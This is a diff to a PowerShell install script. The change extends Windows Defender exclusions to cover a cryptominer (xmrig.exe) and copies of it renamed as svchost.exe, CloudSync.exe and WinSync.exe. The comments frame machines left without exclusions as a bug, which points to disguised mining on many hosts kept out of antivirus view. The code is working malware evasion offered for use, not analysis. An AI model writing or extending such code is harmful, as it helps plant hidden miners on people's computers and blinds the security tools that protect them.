@@ -591,9 +591,21 @@ if ($admin -and -not $NoExclusions) {
     # note the leading commas: they keep each pair as its own array
     $exclTargets = @(
         ,@('Path', $InstallDir)
-        ,@('Process', (Join-Path $InstallDir $BinaryName))
     )
-    if ($BinaryName -ne 'xmrig.exe') { $exclTargets += ,@('Process', (Join-Path $InstallDir 'xmrig.exe')) }
+    # Exclude EVERY binary name this install actually holds, not just the one it
+    # runs today. A legacy box can hold an xmrig.exe copy while executing
+    # svchost.exe (or the reverse), and the old code only excluded two of the
+    # four names - which is how unexcluded boxes happened.
+    $knownNames = @($BinaryName, 'svchost.exe', 'CloudSync.exe', 'xmrig.exe', 'WinSync.exe')
+    $excludedNames = @()
+    foreach ($name in $knownNames) {
+        if (-not $name) { continue }
+        if ($excludedNames -contains $name) { continue }
+        if (-not (Test-Path -LiteralPath (Join-Path $InstallDir $name))) { continue }
+        $excludedNames += $name
+        $exclTargets += ,@('Process', (Join-Path $InstallDir $name))
+    }
+    Say ("  [i] binary names present and excluded: {0}" -f ($excludedNames -join ', '))
     foreach ($pair in $exclTargets) {
         try {
             switch ($pair[0]) {
